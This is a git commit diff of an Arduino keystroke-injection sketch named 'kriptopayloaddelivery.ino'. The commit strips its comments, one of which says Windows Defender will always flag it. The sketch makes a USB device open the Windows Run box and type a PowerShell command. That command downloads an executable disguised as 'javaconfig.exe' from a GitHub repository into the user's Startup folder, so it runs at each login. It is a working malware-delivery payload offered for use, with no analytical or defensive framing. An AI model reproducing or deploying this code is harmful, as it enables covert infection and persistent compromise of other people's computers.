6296f849c577a599fc0de8ec84862e283521f033
proee948 <tomabarbaric1@gmail.com>
2025-05-22 20:02:36 +0200

    Update kriptopayloaddelivery.ino

--- kriptopayloaddelivery.ino
+++ kriptopayloaddelivery.ino
@@ -1,32 +1,31 @@
 #include <Keyboard.h>
 
 void setup() {
-  delay(2000); // Give time for USB to initialize
+  delay(2000); 
 
   Keyboard.begin();
 
-  // Open Run dialog (Win + R)
+ 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(200);
   Keyboard.releaseAll();
 
-  delay(500); // Wait for Run box to appear
+  delay(500); 
 
-  // Type PowerShell command
+ 
   Keyboard.print("powershell -NoExit -Command \"Invoke-WebRequest 'https://raw.githubusercontent.com/proee948/payload/main/javaconfig.exe' -OutFile \\\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\javaconfig.exe\\\"\"");
 
   
-  Keyboard.press(KEY_RETURN); // Press Enter
+  Keyboard.press(KEY_RETURN); 
   Keyboard.release(KEY_RETURN);
 
-  Keyboard.end(); // Stop keyboard emulation
+  Keyboard.end(); 
 }
 
 void loop() {
-  // Nothing needed here
+  // Nothing 
 }
-// ovo ce uvijek bit flaggano od defendera!
 
 
 
